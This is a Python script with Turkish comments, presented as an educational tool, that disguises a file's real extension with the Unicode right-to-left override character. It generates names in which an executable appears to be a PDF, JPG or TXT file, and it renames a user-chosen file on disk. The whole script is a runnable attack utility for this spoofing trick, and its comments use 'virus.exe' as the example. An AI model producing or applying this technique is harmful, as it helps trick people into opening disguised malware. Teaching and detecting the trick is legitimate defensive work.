import os
import tkinter as tk
from tkinter import filedialog
import unicodedata

RTLO_CHAR = "\u202e"

def sanitize_filename(name: str, allow_rtlo: bool = False) -> str:
    """
    Dosya adını temizler. Ancak allow_rtlo True ise
    RTLO karakterine dokunmaz (Eğitim amaçlı gösterim için).
    """
    cleaned = ""
    for ch in name:
        # Eğer karakter RTLO ise ve buna izin veriliyorsa ekle
        if allow_rtlo and ch == RTLO_CHAR:
            cleaned += ch
            continue
        
        # Diğer kontrol karakterlerini temizle
        if unicodedata.category(ch)[0] != "C":
            cleaned += ch
            
    return cleaned

def create_spoofed_extension(original_name: str, fake_extension: str):
    """
    Gerçek uzantıyı saklayıp, sahte bir uzantı gibi görünmesini sağlar.
    Örnek: 'virus.exe' dosyasını 'virus_exe.pdf' gibi gösterir.
    """
    base, real_ext = os.path.splitext(original_name)
    
    # Noktayı kaldır (örn: .exe -> exe)
    real_ext_clean = real_ext.replace(".", "")
    
    # Sahte uzantıyı ters çeviriyoruz (pdf -> fdp)
    # Çünkü RTLO karakterinden sonra her şey ters yazılacak.
    fake_ext_reversed = fake_extension[::-1]
    
    # MANTIK: dosya_adi + [RTLO] + (ters_sahte_uzantı) + (gerçek_uzantı)
    # EKRANDA: dosya_adi + (gerçek_uzantı) + (düz_sahte_uzantı)
    # ÖRNEK: 'belge' + [RTLO] + 'fdp.exe'  -> Ekranda 'belgeexe.pdf' görünür
    
    spoofed_name = f"{base}{RTLO_CHAR}{fake_ext_reversed}{real_ext}"
    return spoofed_name

def main():
    root = tk.Tk()
    root.withdraw()

    print("--- DOSYA UZANTISI GİZLEME (RTLO) EĞİTİM ARACI ---")
    print("Lütfen üzerinde çalışacağınız dosyayı seçin...")
    
    file_path = filedialog.askopenfilename(title="Bir dosya seçin")
    if not file_path:
        print("Dosya seçilmedi.")
        return

    directory, original_name = os.path.split(file_path)
    base, real_ext = os.path.splitext(original_name)
    
    print(f"\nSeçilen Dosya: {original_name}")
    print(f"Gerçek Uzantı: {real_ext}")

    # Öğrencilere göstermek için örnek senaryolar
    print("\n--- Hileli İsimlendirme Örnekleri ---")
    
    # Senaryo 1: EXE dosyasını PDF gibi göstermek
    spoof_pdf = create_spoofed_extension(original_name, "pdf")
    print(f"1. PDF gibi görünen hali: {spoof_pdf}  <-- Ekranda 'pdf' sonda görünür ama aslında '{real_ext}' çalışır.")

    # Senaryo 2: EXE dosyasını JPG gibi göstermek
    spoof_jpg = create_spoofed_extension(original_name, "jpg")
    print(f"2. JPG gibi görünen hali: {spoof_jpg}")

    # Senaryo 3: JS dosyasını TXT gibi göstermek
    spoof_txt = create_spoofed_extension(original_name, "txt")
    print(f"3. TXT gibi görünen hali: {spoof_txt}")

    print("\n------------------------------------------------")
    choice = input("Hangi sahte uzantıyı uygulamak istersiniz? (pdf/jpg/png/txt yazın veya 'iptal'): ").strip().lower()

    if choice in ["iptal", "exit", ""]:
        return

    # Seçilen sahte uzantıya göre yeni isim oluştur
    new_name = create_spoofed_extension(original_name, choice)
    
    # NOT: Burada sanitize yaparken RTLO'ya izin vermeliyiz!
    new_name = sanitize_filename(new_name, allow_rtlo=True)
    
    new_path = os.path.join(directory, new_name)

    print(f"\nOluşturulacak dosya adı (Unicode): {new_name.encode('utf-8')}")
    print("Dikkat: İşletim sistemi dosya gezgininde bu dosya masum bir belge gibi görünecektir.")

    confirm = input("Dosya adını değiştirmek istiyor musunuz? (e/h): ")
    if confirm.lower() == 'e':
        try:
            os.rename(file_path, new_path)
            print("\nBAŞARILI! Dosya yeniden adlandırıldı.")
            print("Klasöre gidip dosyaya baktığınızda uzantının gizlendiğini göreceksiniz.")
        except Exception as e:
            print("Hata oluştu:", e)
    else:
        print("İşlem iptal edildi.")

if __name__ == "__main__":
    main()
